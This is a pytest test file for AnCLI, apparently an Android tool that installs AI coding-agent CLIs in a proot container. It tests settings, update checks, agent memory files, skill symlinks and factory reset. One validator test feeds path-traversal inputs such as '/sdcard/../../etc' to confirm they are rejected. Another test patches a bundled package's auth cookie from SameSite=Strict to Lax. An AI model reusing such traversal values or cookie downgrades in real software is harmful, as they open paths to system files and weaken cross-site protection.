    def test_proot_wrapper_mounts_the_channel(self, tmp_path, monkeypatch):
        self._paths(tmp_path, monkeypatch)
        core.generate_proot_wrapper("mimo", {}, [])
        wrapper = (tmp_path / "ancli" / "bin" / "mimo").read_text(encoding="utf-8")
        assert f"ANCLI_DATA_MNT={core.ANDROID_DATA_MNT}" in wrapper
        assert 'mount --bind /data "$ANCLI_DATA_MNT"' in wrapper
        assert "/proc/mounts" in wrapper          # idempotent: never stack mounts
        assert 'id -u' in wrapper                 # best effort: root only

    def test_ensure_android_data_is_idempotent(self, monkeypatch):
        calls = []
        monkeypatch.setattr(core, "_android_data_mounted", lambda: True)
        monkeypatch.setattr(core.os, "system", lambda cmd: calls.append(cmd) or 0)
        assert core.ensure_android_data(verbose=False) is True
        assert calls == [], "must not mount again when the channel already exists"

    def test_ensure_android_data_reports_failure_without_raising(self, monkeypatch, tmp_path):
        monkeypatch.setattr(core, "_android_data_mounted", lambda: False)
        monkeypatch.setattr(core, "ANDROID_DATA_MNT", str(tmp_path / "mnt" / "ancli-data"))
        monkeypatch.setattr(core.os, "system", lambda cmd: 1)
        assert core.ensure_android_data(verbose=False) is False


class TestDefaultWorkingDirectory:
    """A tool launched from `/` starts in a small directory instead of scanning
    the whole container; users can point that at a project tree with
    `ancli config --set default_cwd=...` (also editable in the WebUI)."""

    def _cfg(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "CONFIG_FILE", str(tmp_path / "cfg.json"))
        monkeypatch.setattr(core, "ROOTFS", str(tmp_path / "rootfs"))

    def test_bind_root_is_accepted_without_a_disk_entry(self, tmp_path, monkeypatch):
        # /sdcard only exists once the wrapper binds it, never under $ROOTFS.
        self._cfg(tmp_path, monkeypatch)
        ok, err = core.set_default_cwd("/sdcard/projects")
        assert ok and err == ""
        assert core.get_default_cwd() == "/sdcard/projects"

    def test_relative_and_traversal_paths_are_rejected(self, tmp_path, monkeypatch):
        self._cfg(tmp_path, monkeypatch)
        for bad in ("sdcard", "../etc", "/sdcard/../../etc", ""):
            if bad == "":
                continue
            ok, err = core.set_default_cwd(bad)
            assert ok is False and err

    def test_missing_container_directory_is_rejected(self, tmp_path, monkeypatch):
        self._cfg(tmp_path, monkeypatch)
        ok, err = core.set_default_cwd("/nope/definitely-missing")
        assert ok is False and "看不到" in err
        assert core.get_default_cwd() == ""

    def test_existing_container_directory_is_accepted(self, tmp_path, monkeypatch):
        self._cfg(tmp_path, monkeypatch)
        os.makedirs(tmp_path / "rootfs" / "srv" / "project")
        ok, err = core.set_default_cwd("/srv/project")
        assert ok and err == ""

    def test_empty_value_resets_to_the_builtin(self, tmp_path, monkeypatch):
        self._cfg(tmp_path, monkeypatch)
        core.set_default_cwd("/sdcard")
        ok, _ = core.set_default_cwd("")
        assert ok
        assert core.get_default_cwd() == ""

    def test_settings_json_reports_the_effective_directory(self, tmp_path, monkeypatch, capsys):
        self._cfg(tmp_path, monkeypatch)
        core.settings_command(["--json"])
        payload = json.loads(capsys.readouterr().out)
        assert payload["effective_cwd"] == core.DEFAULT_CWD
        assert payload["default_cwd"] == ""
        assert payload["supported_keys"] == ["default_cwd", "lang", "proxy_mode", "proxy_url", "agent_memory", "update_channel", "container_profile"]
        assert payload["container_profile"] == "standard"
        assert payload["agent_memory"] == "unconfigured"
        assert payload["update_channel"] == "stable"
        assert "detected_proxy" in payload
        assert "proxy_connected" in payload

    def test_set_proxy_url_supports_ip_port_and_url(self, tmp_path, monkeypatch):
        self._cfg(tmp_path, monkeypatch)
        ok, err = core.set_proxy_url("192.168.1.10:7890")
        assert ok
        assert core.load_config()["proxy_url"] == "http://192.168.1.10:7890"

        ok, err = core.set_proxy_url("http://10.0.0.2:8080")
        assert ok
        assert core.load_config()["proxy_url"] == "http://10.0.0.2:8080"

        ok, err = core.set_proxy_url("")
        assert ok
        assert core.load_config()["proxy_url"] == ""

        ok, err = core.set_proxy_url("not_a_valid_port")
        assert not ok

    def test_proot_wrapper_uses_the_configured_directory(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))
        monkeypatch.setattr(core, "MOD_DIR", str(tmp_path / "mod"))
        monkeypatch.setattr(core, "KSU_BIN", str(tmp_path / "ksu"))
        monkeypatch.setattr(core, "AP_BIN", str(tmp_path / "ap"))
        monkeypatch.setattr(core, "SECRETS_DIR", str(tmp_path / "secrets"))
        os.makedirs(tmp_path / "ancli" / "bin", exist_ok=True)
        core.generate_proot_wrapper("mimo", {}, [])

        wrapper = (tmp_path / "ancli" / "bin" / "mimo").read_text(encoding="utf-8")
        assert ".ancli-config.json" in wrapper
        assert "default_cwd" in wrapper
        assert "configured default directory" in wrapper
        assert "ancli config --set default_cwd=" in wrapper   # discoverable hint

    def test_set_update_channel(self, tmp_path, monkeypatch):
        self._cfg(tmp_path, monkeypatch)
        ok, err = core.set_update_channel("beta")
        assert ok
        assert core.load_config()["update_channel"] == "beta"

        ok, err = core.set_update_channel("stable")
        assert ok
        assert core.load_config()["update_channel"] == "stable"

        ok, err = core.set_update_channel("invalid_channel")
        assert not ok
        assert "更新通道" in err

    def test_check_module_update_stable_channel(self, monkeypatch):
        monkeypatch.setattr(core, "_http_json", lambda url, timeout=12: {
            "version": "v1.2.614",
            "versionCode": 26,
            "zipUrl": "https://example.com/ancli.zip",
            "changelog": "https://example.com/cl.md"
        })
        monkeypatch.setattr(core, "_http_text", lambda url, timeout=8: "Changelog line")
        monkeypatch.setattr(core, "_get_current_module_version", lambda: ("v1.2.613-beta", 25))

        res = core.check_module_update("stable")
        assert res["status"] == "ok"
        assert res["channel"] == "stable"
        assert res["has_update"] is True
        assert res["latest_version"] == "v1.2.614"
        assert res["latest_version_code"] == 26
        assert res["zip_url"] == "https://example.com/ancli.zip"

    def test_check_module_update_beta_channel(self, monkeypatch):
        monkeypatch.setattr(core, "_http_json", lambda url, timeout=12: [{
            "tag_name": "v1.2.614-beta",
            "html_url": "https://github.com/AHLLX/AnCLI/releases/tag/v1.2.614-beta",
            "body": "Beta notes",
            "published_at": "2026-11-15T00:00:00Z",
            "assets": [{
                "name": "ancli-26-v1.2.614-beta.zip",
                "browser_download_url": "https://example.com/beta.zip"
            }]
        }])
        monkeypatch.setattr(core, "_get_current_module_version", lambda: ("v1.2.613-beta", 25))

        res = core.check_module_update("beta")
        assert res["status"] == "ok"
        assert res["channel"] == "beta"
        assert res["has_update"] is True
        assert res["latest_version"] == "v1.2.614-beta"
        assert res["latest_version_code"] == 26
        assert res["zip_url"] == "https://example.com/beta.zip"


class TestAgentMemory:
    """The generated guest-global memory file is informative and non-destructive."""

    def _target(self, tmp_path, monkeypatch):
        target = tmp_path / "default-cwd"
        target.mkdir()
        memory = target / "AGENTS.md"
        monkeypatch.setattr(core, "_effective_default_cwd", lambda: str(target))
        monkeypatch.setattr(core, "_runtime_context_target",
                            lambda: (str(target), str(memory)))
        return target, memory

    def test_creates_rendered_memory_with_environment_and_guidance(self, tmp_path, monkeypatch):
        _, memory = self._target(tmp_path, monkeypatch)
        monkeypatch.setattr(core, "load_installed", lambda: {
            "dsh": {"name": "DeepSeek Harness", "executable": "dsh",
                    "env": {"DEEPSEEK_API_KEY": "secret"}},
        })

        result = core.setup_runtime_context(verbose=False)

        assert result["status"] == "created"
        text = memory.read_text(encoding="utf-8")
        assert core.RUNTIME_CONTEXT_MARKER in text
        assert str(core.VERSION) in text
        assert str(memory.parent) in text
        assert "DeepSeek Harness (`dsh`)" in text
        assert "DEEPSEEK_API_KEY" in text
        assert "secret" not in text
        assert "ancli status --json" in text
        assert "共享存储" in text
        assert "/data/local/tmp/build_cache" in text
        assert "faccessat2" in text
        assert "os.access(..., os.X_OK)" in text
        assert "dsh web --no-open" in text

    def test_keeps_existing_user_memory_by_default(self, tmp_path, monkeypatch):
        _, memory = self._target(tmp_path, monkeypatch)
        memory.write_text("# User instructions\nkeep me\n", encoding="utf-8")

        result = core.setup_runtime_context(verbose=False)

        assert result["status"] == "kept"
        assert memory.read_text(encoding="utf-8") == "# User instructions\nkeep me\n"

    def test_replaces_empty_legacy_memory_placeholder(self, tmp_path, monkeypatch):
        _, memory = self._target(tmp_path, monkeypatch)
        memory.write_text("", encoding="utf-8")

        result = core.setup_runtime_context(verbose=False)

        assert result["status"] == "refreshed"
        assert core.RUNTIME_CONTEXT_MARKER in memory.read_text(encoding="utf-8")

    def test_finalizes_first_run_context_with_secret_free_probe(self, tmp_path, monkeypatch):
        target, memory = self._target(tmp_path, monkeypatch)
        template = (
            core.RUNTIME_CONTEXT_MARKER + "\n"
            "当前环境\n"
            "工具通过宿主 wrapper 进入容器。\n"
        )
        memory.write_text(template, encoding="utf-8")
        memory.write_text(
            core._inject_runtime_context_bootstrap(template), encoding="utf-8"
        )
        monkeypatch.setattr(core, "_android_data_mounted", lambda: True)
        monkeypatch.setattr(core, "load_installed", lambda: {
            "agy": {
                "name": "Antigravity CLI", "executable": "agy",
                "installed_version": "1.5.7", "env": {"GEMINI_API_KEY": "secret"},
            }
        })

        result = core.finalize_runtime_context(verbose=False)
        text = memory.read_text(encoding="utf-8")

        assert result["status"] == "finalized"
        assert core.RUNTIME_CONTEXT_FINALIZED_MARKER in text
        assert core.RUNTIME_CONTEXT_PENDING_MARKER not in text
        assert "本设备实测环境" in text
        assert "Antigravity CLI" in text
        assert "GEMINI_API_KEY" not in text

    def test_refresh_only_replaces_ancli_generated_memory(self, tmp_path, monkeypatch):
        _, memory = self._target(tmp_path, monkeypatch)
        memory.write_text(core.RUNTIME_CONTEXT_MARKER + "\nold\n", encoding="utf-8")

        result = core.setup_runtime_context(verbose=False, refresh=True)

        assert result["status"] == "refreshed"
        assert "old" not in memory.read_text(encoding="utf-8")
        assert core.RUNTIME_CONTEXT_MARKER in memory.read_text(encoding="utf-8")

        memory.write_text("# User instructions\n", encoding="utf-8")
        result = core.setup_runtime_context(verbose=False, refresh=True)
        assert result["status"] == "kept"

    def test_links_both_antigravity_global_memory_names(self, tmp_path, monkeypatch):
        _, memory = self._target(tmp_path, monkeypatch)
        gemini_dir = tmp_path / ".gemini"
        monkeypatch.setattr(
            core, "_runtime_context_compat_targets",
            lambda: [str(gemini_dir / "AGENTS.md"), str(gemini_dir / "GEMINI.md")],
        )

        result = core.setup_runtime_context(verbose=False)

        assert [item["status"] for item in result["compatibility"]] == ["linked", "linked"]
        assert (gemini_dir / "AGENTS.md").is_symlink()
        assert (gemini_dir / "GEMINI.md").is_symlink()
        assert os.readlink(gemini_dir / "AGENTS.md") == "../.agents/AGENTS.md"
        assert os.readlink(gemini_dir / "GEMINI.md") == "../.agents/AGENTS.md"

    def test_changing_default_cwd_reports_memory_initialization(self, tmp_path, monkeypatch, capsys):
        monkeypatch.setattr(core, "CONFIG_FILE", str(tmp_path / "cfg.json"))
        monkeypatch.setattr(core, "ROOTFS", str(tmp_path / "rootfs"))
        (tmp_path / "rootfs" / "srv" / "project").mkdir(parents=True)
        monkeypatch.setattr(core, "setup_runtime_context", lambda verbose=True: {
            "path": "/srv/project/AGENTS.md", "default_cwd": "/srv/project",
            "status": "created", "reason": None,
        })

        core.settings_command(["--set", "default_cwd=/srv/project", "--json"])

        payload = json.loads(capsys.readouterr().out)
        assert payload["effective_cwd"] == "/srv/project"
        assert payload["runtime_context"]["status"] == "created"

    def test_agent_memory_disabled_cleans_up_template_and_symlinks(self, tmp_path, monkeypatch):
        _, memory = self._target(tmp_path, monkeypatch)
        cfg_file = tmp_path / "cfg.json"
        monkeypatch.setattr(core, "CONFIG_FILE", str(cfg_file))
        gemini_dir = tmp_path / ".gemini"
        monkeypatch.setattr(
            core, "_runtime_context_compat_targets",
            lambda: [str(gemini_dir / "AGENTS.md"), str(gemini_dir / "GEMINI.md")],
        )

        ok, err = core.set_agent_memory("enabled")
        assert ok
        assert memory.exists()

        ok, err = core.set_agent_memory("disabled")
        assert ok
        assert not memory.exists()
        assert not (gemini_dir / "AGENTS.md").exists()
        assert not (gemini_dir / "GEMINI.md").exists()

        res = core.setup_runtime_context(verbose=False)
        assert res["status"] == "disabled"


class TestDshCookiePatch:
    """Android hands the `dsh web` URL to Chrome through an Intent, which Chrome
    treats as cross-site, so a SameSite=Strict auth cookie is dropped on the token
    redirect and the UI answers "authentication required". Lax fixes that hop."""

    def _install_file(self, tmp_path, monkeypatch, body="SameSite=Strict"):
        monkeypatch.setattr(core, "ROOTFS", str(tmp_path))
        directory = (tmp_path / "usr/local/lib/node_modules/@deepseek-ai/dsh/node_modules"
                                 "/@deepseek-ai/dsh-client-connection/lib")
        directory.mkdir(parents=True)
        target = directory / "index.js"
        target.write_text(f'const c = `a=b; Path=/; HttpOnly; {body}`\n', encoding="utf-8")
        return target

    def test_relaxes_strict_to_lax(self, tmp_path, monkeypatch):
        target = self._install_file(tmp_path, monkeypatch)

        patched = core.patch_dsh_web_cookie(verbose=False)

        assert [os.path.normpath(p) for p in patched] == [os.path.normpath(str(target))]
        assert "SameSite=Lax" in target.read_text(encoding="utf-8")
        assert "SameSite=Strict" not in target.read_text(encoding="utf-8")

    def test_is_idempotent(self, tmp_path, monkeypatch):
        target = self._install_file(tmp_path, monkeypatch)
        core.patch_dsh_web_cookie(verbose=False)

        assert core.patch_dsh_web_cookie(verbose=False) == []
        assert target.read_text(encoding="utf-8").count("SameSite=Lax") == 1

    def test_reports_nothing_when_dsh_is_absent(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "ROOTFS", str(tmp_path))
        assert core.patch_dsh_web_cookie(verbose=False) == []


class TestSharedSkillDirs:
    """One global skills root, symlinked from every agent CLI that reads its own."""

    def _home(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "SHARED_SKILL_DIR", str(tmp_path / ".agents" / "skills"))
        monkeypatch.setattr(core, "SKILL_LINK_DIRS", (
            str(tmp_path / ".claude" / "skills"),
            str(tmp_path / ".grok" / "skills"),
            str(tmp_path / ".config" / "opencode" / "skills"),
        ))
        return tmp_path

    def test_creates_shared_root_and_links_every_tool(self, tmp_path, monkeypatch):
        home = self._home(tmp_path, monkeypatch)
        result = core.setup_skill_dirs(verbose=False)

        assert (home / ".agents" / "skills").is_dir()
        for rel in (".claude/skills", ".grok/skills", ".config/opencode/skills"):
            link = home / rel
            assert link.is_symlink(), rel
            assert os.path.realpath(link) == os.path.realpath(home / ".agents" / "skills")

    def test_is_idempotent(self, tmp_path, monkeypatch):
        self._home(tmp_path, monkeypatch)
        core.setup_skill_dirs(verbose=False)
        result = core.setup_skill_dirs(verbose=False)
        assert result["created"] == []
        assert result["kept"] == []

    def test_never_touches_a_tool_dir_with_its_own_skills(self, tmp_path, monkeypatch):
        home = self._home(tmp_path, monkeypatch)
        own = home / ".grok" / "skills" / "private"
        own.mkdir(parents=True)
        (own / "SKILL.md").write_text("---\nname: private\ndescription: x\n---\n")

        result = core.setup_skill_dirs(verbose=False)

        assert not (home / ".grok" / "skills").is_symlink()
        assert (own / "SKILL.md").exists()          # user content untouched
        assert str(home / ".grok" / "skills") in result["kept"]

    def test_replaces_an_empty_placeholder_dir(self, tmp_path, monkeypatch):
        home = self._home(tmp_path, monkeypatch)
        (home / ".claude" / "skills").mkdir(parents=True)

        core.setup_skill_dirs(verbose=False)

        assert (home / ".claude" / "skills").is_symlink()

    def test_keeps_a_symlink_pointing_somewhere_else(self, tmp_path, monkeypatch):
        home = self._home(tmp_path, monkeypatch)
        other = home / "elsewhere"
        other.mkdir()
        (home / ".claude").mkdir()
        os.symlink(other, home / ".claude" / "skills")

        result = core.setup_skill_dirs(verbose=False)

        assert os.path.realpath(home / ".claude" / "skills") == os.path.realpath(other)
        assert str(home / ".claude" / "skills") in result["kept"]


class TestInstallSelfCheck:
    """A "successful" install that left no runnable binary must fail loudly."""

    def test_reports_failure_when_no_binary_and_no_version(self, tmp_path, monkeypatch, capsys):
        _core_paths(tmp_path, monkeypatch)
        monkeypatch.setattr(core, '_probe_installed_version', lambda app, reg=None: None)
        monkeypatch.setattr(core, '_binary_exists', lambda exe: False)
        app = {"name": "Broken", "executable": "broken-tool", "version_cmd": "broken-tool --version"}

        assert core._install_proot_common("broken-tool", app) is False
        assert 'does not seem to be installed' in capsys.readouterr().out
        assert 'broken-tool' not in core.load_installed()

    def test_reports_success_when_the_binary_is_there(self, tmp_path, monkeypatch, capsys):
        _core_paths(tmp_path, monkeypatch)
        monkeypatch.setattr(core, '_probe_installed_version', lambda app, reg=None: None)
        monkeypatch.setattr(core, '_binary_exists', lambda exe: True)
        app = {"name": "Fine", "executable": "fine-tool", "version_cmd": "fine-tool --version"}

        assert core._install_proot_common("fine-tool", app) is True
        capsys.readouterr()


class TestArchitectureGuard:
    def test_arm_only_registry_installers_reject_x86_before_any_commands(self, monkeypatch, capsys):
        registry_path = os.path.join(os.path.dirname(__file__), '..', 'src', 'registry.json')
        with open(registry_path, encoding='utf-8') as source:
            registry = json.load(source)
        monkeypatch.setattr(core, '_detect_arch', lambda: 'x86_64')
        monkeypatch.setattr(core, '_install_proot', lambda *args: pytest.fail('installer must not run'))
        for app_id in ('dsh',):
            assert core.install_app(app_id, registry) is False
            message = capsys.readouterr().out
            assert 'x86_64' in message and 'No changes made' in message

    @pytest.mark.parametrize('app_id,asset', [
        ('mimo', 'mimocode-linux-x64-baseline.tar.gz'),
        ('claude-code', 'claude-linux-x64.tar.gz'),
        ('opencode', 'opencode-linux-x64-baseline.tar.gz'),
    ])
    def test_architecture_specific_official_installer_selected(self, monkeypatch, app_id, asset):
        registry_path = os.path.join(os.path.dirname(__file__), '..', 'src', 'registry.json')
        with open(registry_path, encoding='utf-8') as source:
            registry = json.load(source)
        app = registry['apps'][app_id]
        monkeypatch.setattr(core, '_detect_arch', lambda: 'x86_64')
        selected = []
        monkeypatch.setattr(core, '_install_proot', lambda _, definition, __: selected.append(definition) or True)
        assert core.install_app(app_id, registry)
        assert asset in selected[0]['install_cmd']
        assert asset in core._arch_command_app(app, 'update')['update_cmd']
        assert core.validate_cmd(selected[0]['install_cmd'])
        monkeypatch.setattr(core, '_detect_arch', lambda: 'arm64')
        assert core._arch_command_app(app, 'install')['install_cmd'] == app['install_cmd']
        monkeypatch.setattr(core, '_detect_arch', lambda: 'unknown')
        assert core._arch_command_app(app, 'install') is None

    def test_unsupported_update_never_runs_installer(self, monkeypatch, capsys):
        monkeypatch.setattr(core, '_detect_arch', lambda: 'x86_64')
        monkeypatch.setattr(core, 'load_installed', lambda: {'dsh': {}})
        monkeypatch.setattr(core, 'run_cmd', lambda *args: pytest.fail('update must not run'))
        assert core.update_app('dsh', {'apps': {'dsh': {
            'name': 'DeepSeek Harness', 'supported_arches': ['arm64'],
            'update_cmd': 'npm install -g @deepseek-ai/dsh',
        }}}) is False
        assert 'x86_64' in capsys.readouterr().out

    def test_supported_and_agnostic_installers_are_dispatched(self, monkeypatch):
        monkeypatch.setattr(core, '_detect_arch', lambda: 'arm64')
        dispatched = []
        monkeypatch.setattr(core, '_install_proot', lambda app_id, app, reg: dispatched.append(app_id) or True)
        registry = {'apps': {'restricted': {'name': 'Restricted', 'supported_arches': ['arm64']},
                             'agnostic': {'name': 'Agnostic'}}}
        assert core.install_app('restricted', registry) is True
        assert core.install_app('agnostic', registry) is True
        assert dispatched == ['restricted', 'agnostic']

    @pytest.mark.parametrize('arch,asset', [
        ('x86_64', 'mimocode-linux-x64-baseline.tar.gz'),
        ('arm64', 'mimocode-linux-arm64.tar.gz'),
        ('unknown', None),
    ])
    def test_list_json_exposes_selected_update_command(self, tmp_path, monkeypatch, capsys, arch, asset):
        registry_path = os.path.join(os.path.dirname(__file__), '..', 'src', 'registry.json')
        with open(registry_path, encoding='utf-8') as source:
            registry = json.load(source)
        reg_path = tmp_path / 'registry.json'
        reg_path.write_text(json.dumps(registry), encoding='utf-8')
        monkeypatch.setattr(core, 'ANCLI_DIR', str(tmp_path))
        monkeypatch.setattr(core, 'INSTALLED_FILE', str(tmp_path / 'installed.json'))
        monkeypatch.setattr(core, 'UPDATE_CACHE', str(tmp_path / 'update-cache.json'))
        monkeypatch.setattr(core, '_detect_arch', lambda: arch)
        core.list_apps_json()
        payload = json.loads(capsys.readouterr().out)
        app = next(item for item in payload['apps'] if item['id'] == 'mimo')
        if asset is None:
            assert app['update_cmd'] == ''
        else:
            assert asset in app['update_cmd']


class TestReviewRegressions:
    def test_four_segment_versions_are_not_truncated(self):
        assert core._ver_key('1.0.0.1')[:4] == (1, 0, 0, 1)
        assert core._update_available('1.0.0', '1.0.0.1') is True

    def test_prerelease_versions_are_compared_not_truncated(self):
        """DeepSeek Harness publishes only prereleases: '0.1.7-rc.2' must not be
        flattened to '0.1.7', or the update badge freezes forever."""
        assert core._first_version('0.1.7-rc.2') == '0.1.7-rc.2'
        assert core._update_available('0.1.7-rc.2', '0.1.7-rc.3') is True
        assert core._update_available('0.1.7-rc.3', '0.1.7-rc.2') is False
        # a release outranks its own prereleases
        assert core._update_available('0.1.7-rc.2', '0.1.7') is True
        assert core._update_available('0.1.7', '0.1.7-rc.3') is False
        assert core._update_available('0.1.6', '0.1.7-rc.2') is True

    def test_scoped_npm_packages_use_one_path_segment(self, monkeypatch):
        urls = []

        def fake(url, timeout=15):
            urls.append(url)
            return {'version': '0.1.7-rc.2'}

        monkeypatch.setattr(core, '_http_json', fake)
        ver, src, err = core._latest_version(
            {'latest': {'source': 'npm', 'package': '@deepseek-ai/dsh'}}, {})
        assert (ver, src, err) == ('0.1.7-rc.2', 'npm:@deepseek-ai/dsh', None)
        assert urls == ['https://registry.npmjs.org/@deepseek-ai%2Fdsh/latest']

    def test_unknown_latest_source_is_reported_not_silently_static(self):
        ver, src, err = core._latest_version({'latest': {'source': 'gitlab'}, 'version': '1.0'}, {})
        assert ver is None and 'unknown latest.source' in err

    def test_static_without_declared_version_never_uses_the_framework_version(self):
        ver, src, err = core._latest_version({'latest': {'source': 'static'}}, {'version': '1.2.3'})
        assert ver is None and src == 'static'

    def test_text_channel_rejects_non_version_bodies(self, monkeypatch):
        monkeypatch.setattr(core, '_http_text', lambda url, timeout=15: '<html>oops</html>')
        ver, src, err = core._latest_version(
            {'latest': {'source': 'text', 'urls': ['https://x/stable']}}, {})
        assert ver is None and 'no version' in err

    def test_text_channel_accepts_a_bare_version(self, monkeypatch):
        monkeypatch.setattr(core, '_http_text', lambda url, timeout=15: 'v1.0.41\n')
        assert core._latest_version(
            {'latest': {'source': 'text', 'urls': ['https://x/stable']}}, {})[0] == '1.0.41'

    def test_registry_declared_value_is_not_labelled_as_a_live_check(self):
        app = {'name': 'X', 'executable': 'x', 'version_cmd': 'x --version', 'version': '1.0',
               'latest': {'source': 'static'}}
        info = {'installed_version': '0.9', 'version_verified': True}
        declared = core._app_record('x', app, True, info,
                                    {'version': '1.0', 'source': 'registry', 'error': None})
        assert declared['cloud_checked'] is False
        live = core._app_record('x', app, True, info,
                                {'version': '1.0', 'source': 'github:a/b', 'error': None})
        assert live['cloud_checked'] is True

    def test_bad_cache_types_do_not_crash(self, tmp_path, monkeypatch, capsys):
        _core_paths(tmp_path, monkeypatch)
        os.makedirs(tmp_path / "ancli", exist_ok=True)
        (tmp_path / "ancli" / ".update_cache.json").write_text('{"ts": 1, "latest": [1, 2]}')
        core.save_installed({"claude-code": {"executable": "claude", "installed_version": "1.0", "env": {}}})

        core.list_apps_json()          # must not raise on a hand-edited cache

        assert json.loads(capsys.readouterr().out)['apps'] == []
        assert core._load_update_cache()['latest'] == {}   # bad type normalised away

    def test_factory_reset_removes_user_state_and_restores_context(self, tmp_path, monkeypatch):
        ancli_dir = tmp_path / "ancli"
        rootfs = tmp_path / "rootfs"
        module_dir = tmp_path / "module"
        root_home = rootfs / "root"
        for path in [root_home, rootfs / "usr" / "bin", rootfs / "bin",
                     rootfs / "usr" / "local" / "bin", module_dir / "system" / "bin"]:
            path.mkdir(parents=True, exist_ok=True)
        (ancli_dir / "runtime-context").mkdir(parents=True)
        template = (
            "<!-- ancli:runtime-context v1 -->\n"
            "apps={{INSTALLED_APPS}}\n"
            "<!-- ancli:first-run:pending -->\n"
            "工具通过宿主 wrapper 进入容器。\n"
        )
        (ancli_dir / "runtime-context" / "AGENTS.md").write_text(template, encoding="utf-8")
        (ancli_dir / "registry.json").write_text(
            json.dumps({"apps": {"fake": {"executable": "fake"}}}), encoding="utf-8")

        monkeypatch.setattr(core, "ANCLI_DIR", str(ancli_dir))
        monkeypatch.setattr(core, "ROOTFS", str(rootfs))
        monkeypatch.setattr(core, "MOD_DIR", str(module_dir))
        monkeypatch.setattr(core, "INSTALLED_FILE", str(ancli_dir / "installed.json"))
        monkeypatch.setattr(core, "SECRETS_DIR", str(ancli_dir / "secrets"))
        monkeypatch.setattr(core, "UPDATE_CACHE", str(ancli_dir / ".update_cache.json"))
        monkeypatch.setattr(core, "DNS_CACHE", str(ancli_dir / ".dns_cache"))
        monkeypatch.setattr(core, "SHARED_SKILL_DIR", str(root_home / ".agents" / "skills"))
        monkeypatch.setattr(core, "SKILL_LINK_DIRS", (str(root_home / ".claude" / "skills"),))
        monkeypatch.setattr(core, "KSU_BIN", str(tmp_path / "ksu"))
        monkeypatch.setattr(core, "AP_BIN", str(tmp_path / "ap"))
        monkeypatch.setattr(core, "_fix_config_permissions", lambda: None)

        (ancli_dir / "installed.json").write_text(
            json.dumps({"fake": {"name": "Fake", "executable": "fake"}}), encoding="utf-8")
        (ancli_dir / "secrets").mkdir()
        (ancli_dir / "secrets" / "fake.env").write_text("SECRET=x", encoding="utf-8")
        (ancli_dir / ".update_cache.json").write_text("{}", encoding="utf-8")
        (ancli_dir / ".webui_old.log").write_text("old", encoding="utf-8")
        current_log = ancli_dir / ".webui_current.log"
        current_log.write_text("reset output", encoding="utf-8")
        (root_home / ".agents").mkdir()
        (root_home / ".agents" / "AGENTS.md").write_text("old memory", encoding="utf-8")
        (root_home / "project.txt").write_text("delete me", encoding="utf-8")
        (rootfs / "usr" / "local" / "bin" / "fake").write_text("binary", encoding="utf-8")
        (rootfs / "usr" / "local" / "lib").mkdir(parents=True)
        (rootfs / "usr" / "local" / "lib" / "node_modules").mkdir()
        reinstalled = []
        monkeypatch.setattr(core, "load_registry", lambda: {"apps": {"fake": {"executable": "fake"}}})
        monkeypatch.setattr(core, "install_app", lambda app_id, registry: reinstalled.append(app_id) or True)

        result = core.reset_environment(keep_log=str(current_log), reinstall=True, verbose=False)

        assert result["status"] == "ok"
        assert reinstalled == ["fake"]
        assert result["reinstalled_apps"] == ["fake"]
        assert not (ancli_dir / "installed.json").exists()
        assert not (ancli_dir / "secrets" / "fake.env").exists()
        assert not (ancli_dir / ".webui_old.log").exists()
        assert current_log.exists()
        assert not (root_home / "project.txt").exists()
        assert not (rootfs / "usr" / "local" / "bin" / "fake").exists()
        context = root_home / ".agents" / "AGENTS.md"
        assert context.exists()
        assert "apps=无（尚未安装工具）" in context.read_text(encoding="utf-8")
        assert core.RUNTIME_CONTEXT_PENDING_MARKER in context.read_text(encoding="utf-8")
        assert core.RUNTIME_CONTEXT_FINALIZED_MARKER not in context.read_text(encoding="utf-8")
        assert (rootfs / "usr" / "local" / "bin" / "xdg-open").exists()

    def test_deploy_guest_ancli_creates_script_and_symlinks(self, tmp_path, monkeypatch):
        rootfs = tmp_path / "rootfs"
        (rootfs / "usr" / "local" / "bin").mkdir(parents=True)
        (rootfs / "usr" / "bin").mkdir(parents=True)
        (rootfs / "bin").mkdir(parents=True)
        monkeypatch.setattr(core, "ROOTFS", str(rootfs))
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))

        ok = core._deploy_guest_ancli(verbose=False)
        assert ok is True
        ancli_bin = rootfs / "usr" / "local" / "bin" / "ancli"
        assert ancli_bin.exists()
        content = ancli_bin.read_text(encoding="utf-8")
        assert "exec python3 /data/local/tmp/ancli/bin/ancli-core.py" in content
        assert (rootfs / "usr" / "bin" / "ancli").is_symlink()
        assert (rootfs / "bin" / "ancli").is_symlink()

    def test_deploy_agy_host_bash_compat_includes_system_bin_and_ksu_ap(self, tmp_path, monkeypatch):
        ancli_dir = tmp_path / "ancli"
        ancli_dir.mkdir(parents=True)
        bin_dir = ancli_dir / "bin"
        bin_dir.mkdir(parents=True)
        compat_file = ancli_dir / "bash-host-compat"
        compat_file.write_text("#!/system/bin/sh\n# AnCLI AGY host bash compatibility\nexec /system/bin/sh \"$@\"\n")

        mod_dir = tmp_path / "modules" / "ancli"
        sys_bin = mod_dir / "system" / "bin"
        sys_bin.mkdir(parents=True)
        ksu_bin = tmp_path / "ksu" / "bin"
        ksu_bin.mkdir(parents=True)
        ap_bin = tmp_path / "ap" / "bin"
        ap_bin.mkdir(parents=True)

        monkeypatch.setattr(core, "ANCLI_DIR", str(ancli_dir))
        monkeypatch.setattr(core, "MOD_DIR", str(mod_dir))
        monkeypatch.setattr(core, "KSU_BIN", str(ksu_bin))
        monkeypatch.setattr(core, "AP_BIN", str(ap_bin))

        deployed = [os.path.normpath(p) for p in core._deploy_agy_host_bash_compat(verbose=False)]
        assert os.path.normpath(str(sys_bin / "bash")) in deployed
        assert os.path.normpath(str(ksu_bin / "bash")) in deployed
        assert os.path.normpath(str(ap_bin / "bash")) in deployed
        assert (sys_bin / "bash").exists()
        assert "AnCLI AGY host bash compatibility" in (sys_bin / "bash").read_text(encoding="utf-8")

    def test_wrapper_signal_exit_and_open_watcher_cleanup(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))
        monkeypatch.setattr(core, "MOD_DIR", str(tmp_path / "mod"))
        monkeypatch.setattr(core, "KSU_BIN", str(tmp_path / "ksu"))
        monkeypatch.setattr(core, "AP_BIN", str(tmp_path / "ap"))
        monkeypatch.setattr(core, "SECRETS_DIR", str(tmp_path / "secrets"))
